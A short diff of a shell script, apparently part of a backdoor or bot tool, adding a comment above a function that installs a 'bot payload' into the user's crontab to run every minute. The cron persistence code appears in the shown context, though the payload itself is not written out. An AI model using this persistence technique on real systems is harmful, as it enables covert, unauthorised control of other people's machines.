@@ -90,6 +90,7 @@ alias_ls(){
 }
 
 # Add a cronjob with bot payload which runs every 1 minute
+# This is a bad idea as it gives away IP and port. 
 cronjob(){
     echo -e "\nInstalling cronjob... \n"
     crontab -l | { cat; echo "* * * * * $payload3"; } | crontab -
